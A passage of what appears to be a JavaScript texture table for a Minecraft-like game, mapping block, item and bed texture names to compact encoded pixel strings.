    "soulFire22": "0g0g=00028H2EZ2oY2.W2Y2PY2W2H7$Z2Y2H2oZ2Y3cH2Z3sZf|YrWjY2Z2Z2WjZ:WZZ2HDY,Z7%Wj|Yb<H2W3cY3sYOZvWf|HnZZZZYZZZZ~H2ZZZY2Y2W2Z2H_HZZZZZZ2WZZZZZZ[YH0000000000000000000000000000018g00000000018w0000000000400000003c(0003gS000ow089E001|-@TkBTS0l)00;F02lI8xJSCfaE&E(3sN*1kEr1_zE",
    "soulFire23": "0g0g:00028H2EZ2oZ2.H2W2H2H2PH2W2.W2H3cH7$Z3sY2Z2oY2Z2Y3cYnZOZ:W2Z2Z2Zf|YvHf|H2Y2H2WjYb<H2Z2H2WZZZZOZ_HY3sZvWZZZYZZ#YZZZY2WZ2Y>YH,ZrWZZY000000000000000000000000000000400000000000000000000000000400002c004T@s000A2$};U004PBkVgS04xCcAS0T4nSI]?.!@k0AM3<7X0N1XGN",
    "soulFire24": "0g0gR0002oY2.W2W2PY2PH2Z28H2W2Y2Y2Z2EZ2.H2W3sZjZnZ2W2Z3sYf|H2H2H2H2W2YLZZrWzHvH7$Z2Z2Y_H:WZZZZYjYnZ>YWZZYWYW3cHDY2WZZZOZZ,ZYZZZzHZZ[YHGZ#YZZ2H2ZY00000000000000000000000000000000000000000000000000000000000000004g(S000006w]S000K(TeuSwK000gx!U108(06(A_o2)A088f@!10o(XFU0l47i{m$0mEcpm!0)B>F@$=Ng",
    "soulFire25": "0g0g>00028H2EZ2oY2.W2Z2Y2H2.H2PH2W2H3sY3sZ2W2Y2oZ3cY2Z2Z2W2Zf|Y#Yb<Wb<H2YrZrWY,ZjY7$ZzHZ:WWYWzH2PY3cH2YYZZZZZHZnZGZ2W[YHZZZZYY7%WZZZvWLZZZZ2Y2WY2H2Hf|H_H0000000000000000000000000000000000000000000000000008wK00000(S008k(0000wm(0008(2y(MT000ww015C-(X0AST38U6@0$S^q+0g]x>RqQ00d2qi09bCf087^0.-H2aCso",
    "soulFire26": "0g0g;0002EZ2Y2PY2oY2.W2H2H2H2W2H2Y2W2W28H2PH2Z2.H3cHb<H2W3sY7%WLYLZrW3sZ2Y2Z2Zf|H,ZzHzHj|Y2WYZZZZZWYWb<WGZ2Z2ZZZZ7$Z_HZ2HvW:WnZjY2Y2W#Yf|YYZZ0000000000000000000000000000000000000000000g400004g05o940000001^wdk000003AE00Q?kj4>00~9jV0SQktxI016OP05%0bg|*vU*BExtAB",
    "soulFire27": "0g0g,0002oY28H2PH2W2H2Y2Z2H2EZ2PY2.H2.W2W2W2W2Z2Z2oZ2Zf|YjY7%W2Z3cYnZ3sZLZZZ_HrW2HDHb<H2HYvHnZ2Y3cH3sYzHOZZZZ#Y2W7$ZZZZ:W~HZZvWYb<W00000000000000000000000000000000T000000002cT>80000000@k3400000009oo0008008O}<4S09Ak**lS005zgkS04R5gVtS07XXJ047lS!osT6CC4U/_",
    "soulFire28": "0g0g:0002oY2.H2PH2oZ2EZ2Y2Z28H2.W2W2Z2W2Z3cH3sY2W2H7$Z3sZ2ZnZ[YWzHb<W2Wf|HLZDY2YjY2Y2W2H7%W>YW2YrWZZZZZZ2HZ2Y2HZZYvHWYWZZZZLY~HZZ2H>YHZZZZ3cY0000000000000000000000000000004w000000005o000000008kQk00000000ES00S004(S00000[?A001S0[|V02J@%,S03[@8OBPBE?1JoSF0rqs",
    "soulFire29": "0g0g/00028H2oY2EZ2.W2.H2FW2Z2Z2H2Y2W2PY7$ZvWf|H2W2H2H2Y3sYnZjY2Y3cH3cYb<HZZZ2PHb<WDY~HZZZZZZ2WZZ2W2W7%WZZZ>YW#YYZZYYWYWHZZZZZZZZZZDHOZ0000000000000000000g000000000cS0000000004wS000000000000kK0000000g7w000004A$00000g?ETg01i{(X??01?By*U0Jq%0Egg7094=>oonBoo<yooo$T0",
    "soulFire30": "0g0g.00028H2oY2Y2Y2EZ2oZ2Y2Z2W2PY2Z2PH2Z7%W7$Z2Y2.W2WnZ_H2W3sZ2W2W3cH~HOZ2ZZZZ2H2H2ZDYZZGZZb<HHZ3sY#Y[YHf|H:WLY#YYvHZZZZZZZZZZZZYDH0000000000000000000g00000000000000000000000g00000000004g0000000002cTS40000006s4A000_(g2cST04Pg2|RV1mp3h1ox+pPAP1FEJ1JJ2D00Ys<,zc",
    "soulFire31": "0g0g#0002oY2EZ2W2.W2H2Z2Z28H2W2Z2Z2W2H2.H2Hb<W:WrW7%WjYZZZZ#YvWZZZnZvHzHY[YH[YWZYZZZZZHZZnZZZYZZZ0000000000000000000000000000000000000000000000000000004000000000008w0cw0000000go0020005A_(003S1P)ES0<5i?VO1JSJV|9@g?AV?k{PVVlN||VhSJ8qV6q",
    
    sweetBerryBushStage3: "0g0gb000<WPZFXWF>WgWWnZsWQHFzY000i300004SiOk00051SQ003+jRgS1zQ[ES04h?ky07xOIOk05[x)3O09Uyk*1Fh++KigIil004PI850QS>Q]I001o>S]000h(-400000S(300",
    sweetBerryBushStage2: "0g0ga000<WFXWF>WPZWnZgWsWFzY000g200000(k2j00011((002zTi)g1g0@ASk007MNjR00kTzNjw0)N>z2w03oQoz01T+EC00gi[000zIN02(MzI0014oN(-000hwE300000(w200",
    sweetBerryBushStage1: "0g0g7000<WFXWF>WPZsWFzY00880006c8000T09-^2C300N000q(0/|6nVA00U!004(0CqS00|S02U(000oSw0",
    sweetBerryBushStage0: "0g0g5000F>WsWFXWPZ000000000000000000000000000000000000000000000000008{0006qd006E00(003aS00++002A$(000900",
    sweetBerries: "0g0ga000WnZgWwHQHF>WFXW-(ZsW0000000000000000000hg000001zM000001O?0h001Q?1z0GKV)08IV00I6K008hG001z*9051O?000505)?000000V0000000000000000000",
    
    smallDripleafStemBottom: "0g0g5000TZZ3WRZ00T00000000g0000oR000040S000k0S000g(0002w00000000000003g0000wg0000wR0000oy0000gR00008y00",
    smallDripleafStemTop: "0g0g50003WZRZTZ00000000000000S0000S000080g00080g000gKg0002Kw000000000|00001c00001c00001]00008000gS000w0",
    smallDripleafSide: "0g0g20003WV0000000000000000000000000000000",
    smallDripleafTop: "0g0g6RZ3W000ZTZ.NH028PAJ428PAJ1JPAJ0PAJAPAJ0PAJB$PAJ0APAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJ",
    bigDripleafStem: "0g0g5000Z3WRZTZ00]{000iI%002d000dJ000d000A%0000400000P00002Q000+N00060000002g000]iS000Ki0001wi00",
    bigDripleafSide: "0g0g3ZTZ0006",
    bigDripleafTop: "0g0g7ZRZZ3WkWTZ0005AFAI5FxAIzMA|PAFAFymFA@jPA1PAdFyJFi@J]J",
    bigDripleafTip: "0g0g6ZRZZ3W000TZ0ASP4AJ_eAJP%PAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJPA",
    
    xorGateOn: "0g0geY-YZYYZ$HYY8WV?HYWY1h1iMhhh4VVR+l@VVmQ]QTlVQQQkQ^UTl?O,O,yyyylU?l]Q?5TpQkQUTlPUQQQmQVhh1hhhh1",
    xorGate: "0g0geY-Y$0W0WYZ$HQ0WY8WV?HYWY1h1iMhhh4VVR+l@VVmQ]QTlVQQQkQ^UTl?O,O,yyyylU?l]Q?5TpQkQUTlPUQQQmQVhh1hhhh1",
    notGate: "0g0gjY-Y0WYZ$HY8WYV?HWQ0W$0WW{WYYYZ0Rg4ygRgXx0Rgh^96(Rg9^M/6N98TD/M8MSRc986M8MM8MM98Os96OsX16p^~gXc8M@96NcM9^M^Ng8Rg4LRgX1",
    notGateOn: "0g0gkY-YYYYZ$HY8WYV?HWZYZYZRYW{W0WYZ0Rg4yoRgXx1ahg9]o.a9RgR]>o9^hRiRg98Rk{I9^g}KIRk98Rt2iiRg98RtfiRg9^>fgJk9]>hg1]p98RkIo9]R8Rg9RgR8Rg4MIRgX1",
    andGateOn: "0g0goY-YYYYZ$HYZYZY8WZRYYWW{WW0WQ0WZ$0W?WYZ0Rg4yoRgXx1apg9]oha9Rs]]o9^_Sg98MRiE9^}Sg-xIRs.NBP9^VS9]F^o1]X!98Rm9]RXx8Rg9RgMR8Rg4x8RgX1",
    andGate: "0g0goY-Y0WQ0WYZ$HY$0W8WYW{WWYYZYZYZRYYZ?WWZ0Rg4yoRgXx1apg9]oxa9RsT>o9^>RJJg98#g9^.#g?n8RqgTB7w9^G/9]F^1]XF^989]RXx8Rg9RgMR8Rg4x8RgX1",
    orGateOn: "0g0glY-YHYYZ$HV?H8WYQ0WZY0WY$0WZRYYYWWZ0Rg4yoRgXx1apg9]opa9Rgp8>o9^gp]Rg98Rt2q]9^qiRkg*dxd9_4wqgJk9P4x8Qyg1P(XygJg992kM>o9]RXx8Rg9RgMR8Rg4x8RgX1",
    orGate: "0g0gjY-Y0WQ0WYZ$HV?H8WYYZY$0WZRYYYWWZ0Rg4yoRgXx1apg9]opa9Rgp8>o9^gp]Rg98Rt2q]9^x3qkRkg>icoqM9^x8RkJk9]x8>2g1PgXygJg98kMzo9]RXx8Rg9RgMR8Rg4x8RgX1",
    
    pointedDripstoneDownTipMerge: "0g0g5000HHVW,W02P002^|0039%003AF004P|004P$00000001A$0000P{0000{00000000{0000K00009S0000cS0000AK00",
    pointedDripstoneUpTipMerge: "0g0g5000,WVWHH009S0000p0000r0000S0001bI0001r]0000I0000I0000P0000E000800080006P00060006S006w0",
    pointedDripstoneDownFrustum: "0g0g6000,WHVWAHH0JJS1AJ]0JV[S1#JPS1i]0iV0k]0iS0y^^00A@00UJ@00aP002@002|+004P(004V(0",
    pointedDripstoneDownMiddle: "0g0g6000H,WHAHVW0JS1AJPS0S0_S0]01A00^01AS0JP_S0CS0_S0iPJPS0y+S0APS1iPS1yJ_S",
    pointedDripstoneUpFrustum: "0g0g6000H,WHVWAH02J002J&004004006J%00NP00i_00k00A_+0y00A00001A0J|01AP+",
    pointedDripstoneUpMiddle: "0g0g6000,WHHAHVW0J_S0JS0iPS0k^S0AJJPS1y_S1i^^S1AJ_S0JS1k^00J01i]01C_S1y^S0JJPS1iJS",
    pointedDripstoneDownBase: "0g0g6H,WHAHVW0000iBA]2RAJ]@AA|A0JBJR^,lgAJ2C4J|J]JAiJ4J]i,lJRPBg02P%gi%",
    pointedDripstoneDownTip: "0g0g5000HHVW,W02B000%000J|001A?000%000i{0000A0000A{0000iw0000aw00002w00000000000000000000000000000000",
    pointedDripstoneUpBase: "0g0g6000H,WHAHVW0J_S4PCS5A_5y+4JPo4Po5A4^5A_o4Po9ABy_]PPA%JPBAJ",
    pointedDripstoneUpTip: "0g0g5000HH,WVW000000000000000000000000000000001S0000hS00009S0000r(0000r00009(00000000!0000PN0000^w004^S0",
    dripstoneBlock: "0g0g5H,WHVWAH43wQge@y9gJR4Br1i8PIQ2{40i4iTiUQ4AKi90dE|A^i^J)d3T1k]di",
    pointedDripstone: "0g0g5000VWHH,W02P004^|000_000J0000^0000b0000c0000b000020000200002K00000000000000000000000000000000",
    
		flame: "080850000WWZKWZH0g00y00)00)01+0111+",
		glint: "080850002W2Y3AZ3H0g00w000FI000w00g0000",
		lavaParticle: "08085000WZKW0WZH00000001QS1]0S000000",
		soulFireFlame: "080850002.W2ZYZZZ0g00y00)00)01+0111+",
    
    oakSign: "0g0ge000WVZ*HWWHkZyHH{H-YWyY00000000000000000hyONxzS0BOO+S0++K0jOOOOO0zVOS0+K0jOOOOO0QQQQQQS0IIIIII0009000000c000000c000000c0000009000",
    mangroveSign: "0g0gf000OY3HHZZwKYJWHZQW{H;WyZ>W00000000000000000hyONxzS0BOO+S0++0jOOOOO0zVOS0+0jOOOOO0QQQQQQS0000a000000b000000a000000e000000b000",
    darkOakSign: "0g0gf000Y{Y]H-WNHVY(Z;WwY;Z(WEWiY]Z00000000000000000hyONxzS0BOO+S0++0jOOOOO0zVOS0+0jOOOOO0QQQQQQS0000a000000d000000d000000d000000a000",
    crimsonSign: "0g0gd0006WXYHY)HKYW]H;Z0WWW00000000000000000hyONxzS0BOO+S0++0jOOOOO0zVOS0+0jOOOOO0QQQQQQS0000a000000b0000008000000b000000a000",
    warpedSign: "0g0gh000+W/-Z/8WFH8WhVW%WtVWgHlYQZ;ZiHlHUZ]H0000000000000000000002h8oXhc04pN06cpc02MoM004NoN06cFOc02MoM008RgXx8Rg0iF^w0000a00000000b0000000f0000000b00000000e0000",
    spruceSign: "0g0gf000YYHyZ;ZwKYiHRZQH(Y$Y$Y{H-W00000000000000000hyONxzS0BOO+S0++0jOOOOO0zVOS0+0jOOOOO0QQQQQQS0000a000000d000000d000000d000000a000",
    jungleSign: "0g0gi000+YmHHH;ZwKYHYKYVMYHSWHhY;WJHNW0000000000000000000002h8oXhc04pN06cpc02MoM004NoN06cFOc02MoM008RgXx8Rg0iF^w0000a00000000d00000000b00000000g0000000e0000",
    acaciaSign: "0g0gf000ZHWRY;ZwKYNYWWYQYAWnHY00000000000000000hyONxzS0BOO+S0++0jOOOOO0zVOS0+0jOOOOO0QQQQQQS0000a000000d000000d000000d000000a000",
    birchSign: "0g0gh000EZ8HYGH;ZwKYHHHY|HZZZZH)YY0000000000000000000002h8oXhc04pN06cpc02MoM004NoN06cFOc02MoM008RgXx8Rg0iF^w0000a00000000d0000000d0000000d00000000e0000",
    composter: [
			/*compost*/"0g0g7000]YhYMWYWJW0000000000000JNS0US1]ES2jkyS2A]02E00yC>02kUI2C]1R{^O00J-S0zRS000000000000",
    	/*bottom*/"0g0g4ZxZWY41SgLY]tAxc8xc]w9)wpswottMB]sxB8]xx]]M({{P|=Z41Sg",
    	/*ready*/"0g0gb000]YhYMWYY^HWzWWJW00000000000000000hzTQh00i?Dx00CT00]h00RDyoU00?U00oAQk00QDVO00[RD>00Bk00h!J>T00hQ>TQh00000000000000000",
    	/*side*/"0g0gcZWZxZYW;ZAHQZZMH?0H100h01g1yNyNyzNyzyOzzOyO?U?QQVQ?NhixhNhiOyyONyzzQQQQQQQQIzxhhihzyyNzNyzyzQQQQQQQQzxhhyNhhyzyONyyzQQQQQQQQ",
    	/*top*/"0g0g5ZWZxZ0000900SF|ePAJPoaPAJPhaPAJPhaPAJPg&PAJPo!PAJPoePAJPpePAJPpaPAJPgaPAJPg!PAJPoePAJPpdP090gS"
		],
    cocoaStage2: "0g0g8KYYZ000Z*WYH5A]:HF4J]W:BW4I==9A",
    cocoaStage1: "0g0g8UYNHUY000HVWAHiW4J+FN+/KJ>4Jr___HZ",
    cocoaStage0: "0g0gaJYHH000YYZQWHZ1wOOOOO?kOOOO)COOOO@2gOOOOzOOOOO(OOOOON@zOOOOON@zOOOOOMjOOOOO(h3OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO",
    cocoaBeans: "0g0g5000H{WiH(KY00000000000000000000040000?0009S0042000870013(O00+4*00Nc800D0000940000000000000000000",
    goldenApple: "0g0ga000WWUYWZHAHHWUSY00000000000010000000z0000000g000002xMg0002?>CTg00AVh00AGGGT00A00k@@[00kQQ[P001QQ001AQR000JRAF00009hp0000000000",
    rabbitStew: "0g0gk000>W5HyZYZ(YYZYZ+Z;YQZWsW(ZY-H(Y0000000000000000000000000000000000000000000000000000001g0000000ch{00000MQhM006y00oI>rX00p8p;001-RgXzD0007(X00000100000000000000000000000",
    goldenCarrot: "0g0gb000SYUHHUSYAHW(WWHZH000000000001i0000000x(i0002jxNj0000zjxw0000?N0008[N(00800XO000[3008X00008S0000S00000Q000000Q00000000000000",
    carrot: "0g0gb000NWuZ1WW(YZ1SWWZZ7H000000000001i0000000x(i0002jxNj0000zjxw0000?N0008[N(00800XO000[3008X00008S0000S00000Q000000Q00000000000000",
    beetrootSoup: "0g0gb000;YXZHWsWQZ(ZY-H(Y0000000000000000000000000000000000000000001hhg0001izOMg00iQQRy*00myy+00n00aGGG000VV00000VV000000000000000000000000000",
    beetroot: "0g0g8000ZZHAZYJZH0000000000000005000000000iS000+005005A005(00z+00%B00y000+000006000000000000000",
    tropicalFish: "0g0gb000RZAYKY2WZWWWY00W00000000000001g0000001x000000izS001gh)S00nMS000o0000nIp0001yp0001myx000oV000qp0000m0000M0000090000000000000",
    cookedSalmon: "0g0gg000iHGHY;YZNWhZWWoH<)WHWkH|W00000000000001g0000001x000000izS001gV)S00i*S000j0000000b000b000000Z0000Y100003q000000O0000000000000",
    rawSalmon: "0g0gg0003Z]YZ;YZWYkHWoH<)WHWkH|W00000000000001g0000001x000000izS001gV)S00i*S000j0000000b000b000000Z0000Y100003q000000O0000000000000",
    cookedRabbit: "0g0g8000Z+WWWWiWH0000000000J00i]5)S0!@I6AJ@5DAJ+50Q3G]3?0#0fv00030000f000000000000",
    rawRabbit: "0g0g8000HZ#ZZWIZnWQH0000000000J00i]5)S0!@I6AJ@5DAJ+50Q3GP3?0#0fv00030000f000000000000",
    cookedPorkchop: "0g0gb000WWH!HNHH8Y^ZWY00000000000000000000000000001yg00000j>B00001+000kG001+XGJ00jX02+]G00zPGPB00C!002)x0001yyl000005V00000000000",
    rawPorkchop: "0g0g9000?WWHXZ-ZZJHZsH000000000000000000001hg00000iy)00001y*S000mzS00hN*S01VyO*01+Nz0iB+A00iz[00iOIA004mIUG0004T[000007G00000000000",
    cookedMutton: "0g0ga000ZYXH2ZzYHYEZ)W00000000000001g000000zT000000z000002+000002]00000D]00002o0002zg000DOg002V00DV00D.V000k+Go000hho0008II000",
    rawMutton: "0g0ga000YZYWHYEWQwHW00000000000001g000000zT000000z000002+000002]00000D]00002o0002zg000DOg002V00DV00D.V000k+Go000hho0008II000",
    cookedCod: "0g0ga000CHqZWZHZ00WBWiY00000000000001g0000001x0000001zg0000hhMS000hxkS001l0000iyA0001l0001xyCS000Q>0000[)S0000>-Q00000]00000090000000000000",
    rawCod: "0g0g7000WBWqZZiY00W0000000000k00000,0000100w04E04?008!00R00]N02jaJ02002i002%0000S000000000",
    cookedChicken: "0g0ga000iWYGY+WWHWW!Z00000000001hg00000i)xg0000B0001R+001R>D001i+OR0k*+)R0kT*hQB0kxjiD00ilm00zNn00hOx0000hG00000G000000000000",
    rawChicken: "0g0ga000HHZ]WZZQH#ZW!Z00000000001hg00000iOxg0000>ART0001NR*K001N,VC001jVGNK0j)NK0jMhOAK0jxjiC00iklT@00TBNmK00hOxK0000h00000000000000000",
    pumpkinPie: "0g0gd000ZZ,ZWWBWZYWWZWY00000000000000000000000000000000001hhg0001iyOMg00j)VV>M01)V@V>g1*]?1@VR1VUzayy;0OO0000O0000a0000000000",
    cookie: "0g0g8000HyY]H3ZWUYQW00000000000000PA00iJi006j_CG_]iIi]a-t|3Al0B001ZZ0000000000000",
    cookedBeef: "0g0ga000{YZzH>ZZWYEZ;H00000000000000000000000000001hg00000iNT00001[Dg000k?)00hB01[R01B?00i+R00mzz001>000800008I00000000000",
    rawBeef: "0g0g9000HDWYHYQYWQwH00000000000000000000000000001hg00000i)00001C?)g000j)00h@@x01@)[01?)0kA*[00i*UG00yUh0008hh0000II00000000000",
    bakedPotato: "0g0gb000WkHWYZH*YWWZ0000000000000000000000000001hh00001iOQg000j)VV001)V001?GUg0iGQ0jO^0k)V0lIN?009>Q000y0000900000000000",
    potato: "0g0ga000WZWYkHWW]HZ000000000000000000000000000000000000hh00001hz?g000i)OT001+O)[00kO)00jORD00OUy00U)RG0007G00000GG00000000000000000000",
    milkBucket: "0g0gb000)HYY<HHZZZYYWH00000000001hhg0001izOMg00i?Ux00kT00hkVTh00nhhp00nG00n00o00p001Gg001g000o00001hhg0000000000",
    sugar: "0g0g6000YYZZZZVY000000000000000000001w0000a0000002}00m00OS0pS2>S0Nq00b{000%00000000000000",
    
    beetrootSeeds: "0g0g4000YViYH0000000000m0001070bK0091S250570v0H0000!0000000000",
    beetrootsStage3: "0g0g8000Z^NYFYBHWYJY000000000000000000000000000000000000020082I5(hAM@+V/as[i59n&br,dYH",
    beetrootsStage2: "0g0g7000Z^NYFYBHWY00000000000000000000000000000000000000000000000000]00h82hQ)C+)EPI9h{C903K)lA",
    beetrootsStage1: "0g0g5000Z^NYFYBH000000000000000000000000000000000000000000000000000000000000000000000000I80I9h{w9030)1A060",
    beetrootsStage0: "0g0g5000Z^NYFYBH0000000000000000000000000000000000000000000000000000000000000000000000000090000wgwg0100S401z0E0",
    potatoesStage3: "0g0g9000FY^NYZBHW)YYXY00001000002(1(000003yj0000020O00003k(00000Mww00000O02O00000031(0001w20w00010w0000j0Aw0g001w3x0(000g2g200021xR10005UlUl000",
    potatoesStage2: "0g0g8000Z^NYFYBHWY)Y000000000000000000000000000000001S0000850000j400000800000S0000kS00061{00022K2000I(001t0S",
    potatoesStage1: "0g0g6000Z^NYBHFYW000000000000000000000000000000000000000000000000000w00000Q00002800000S0000jS00021Sg001kS0000",
    potatoesStage0: "0g0g5000ZBH^NYFY000000000000000000000000000000000000000000000000000000000000000000000w00002w0000iK00001Kg000X}S0",
    carrotsStage3: "0g0ga000BH^NYFYZxiHHxZWZ0000000000000000000000000g0w0O0002023w0(00x32040012R)0S0033AA3w01zA)jzN(0iNRkTR002TzAzz003xONhM001(jh1(00115g0066K000",
    carrotsStage2: "0g0g6000FY^NYBHZZ00000000000000000000000000000000000000S0008g0010w5030g081(SNycmI1F0+p050",
    carrotsStage1: "0g0g5000^NYZFYBH00000000000000000000000000000000000000000000000000000000000000000002dy0hX2,x@0646008080",
    carrotsStage0: "0g0g4000FY^NYBH000000000000000000000000000000000000000000000000000006A0dtts0",
    
    mudPie: "0g0g9000*KW]WSW)WEKWs(W(KWwSW000g0000000g11000101110g10gzNy0g12y)OyM00iORQUN00AV>NNw0NO))UA(0?yRN?(0y?>>N(0I0U?GQS0XIG[008?U[UG000II0000000000",
    greenGrapes: "0g0g70001KY1wHBZWkZ+H1SY000w00001S0000240007b1E21}]09iE1i02s!9S0-B00_OJ1QdE1r.S2A^0000000000000",
    purpleGrapes: "0g0gc000?HH<(Z&zYMYFKYH.YlWlZ-Y000000000000i(00000400007X0008000000I0077IG88I7I008I098a09008000000000000000",
    
    ultraTntTop: "0g0g4ZYZWVW00W6666++++66=WZZZ7ZZW=W+em+u+",
    ultraTntBottom: "0g0g3ZYZWVW6666mmmm6666mmmm6666mmmm6666mmmm",
    ultraTnt: "0g0g9ZWWVSHWWZZZ00WcW-H0i0)0N0h0N4)Sh0M0iQkSMQh0N0NSMSi0M0NShQiVVVVVVVVVVVVVVVVVVVVVVGGGGGGGGM-OhOMMM4N0)SMSN0i4)0hQh0M0kQhSi0hSN4N0i",
    kelpIcon:"0g0g6000VZ3WWHTTW00000000000]0000AI000P+I00J08C0@|S000r06EU006k006o0004B000k0002S000000000",
    
    blackBedIcon: "0g0ga000W00WZY)HoYSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yE2Cyy7yyyG78yyG00007yG00000000000000000000G0000000000000",
    lightGrayBed: [
			"0g0g4EWJZHYhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZWQZWYHYJZEW0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
  		"0g0gbWYHQZW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZWQZWHJZY|WW*WWkZZW0000hh2)VVhg)VUIII,QGyyyyOOOOVUwhh0UE1h8QQ>EIIIOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0geYWHQZ*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    lightBlueBed: [
			"0g0g4!H!Hy;ZNZhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZWlZysHpHy;ZNZ!H!H0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gbysHpHy;ZlZW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZWlZysHy;Z!H|WpHW*WWkZZW0000hh2)VVhg)VUGGG-QIyyyyOOOOV)Uwhh0U)D1h7Q)Q>DGGGOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0gepHysHy;ZlZ*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    magentaBed: [
			"0g0g4YHZrHhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZWWHIWZrHHY0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gbHIWZWW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZWWHZH|WIWW*WWkZZW0000hh2)VVhg)VUGGG-QIyyyyOOOOV)Uwhh0U)D1h7Q)Q>DGGGOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0geIWHZW*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    yellowBedIcon: "0g0gb000W1WZYZWHSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    whiteBedIcon: "0g0g8000WZY|WSWWkZ00000000040001F000_+S0iJ0|5+JPR5)J4Ak9CqJP0000000fS0000dS0000bS000000000",
    yellowBed: [
			"0g0g4Z1YZNYYZYhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZWKYWYYZYZNYZ1Y0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gbWYYKYW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZWKYWYZNY|WYW*WWkZZW0000hh2)VVhg)VUUGGG-QUIyyyyOOOOVQUwhh0UQD1h7QQQ>DGGGOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0geYWYKY*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    purpleBed: [
			"0g0g4ZHHIZhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZWS[WKZYHIZHZ0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gbKZYHS[WW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZWS[WKZHH|WYW*WWkZZW0000hh2)VVhg)VUGGG-QIyyyyOOOOV)Uwhh0U)D1h7Q)Q>DGGGOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0geYKZHS[W*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    lightGrayBedIcon: "0g0gb000WYZYWYYSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
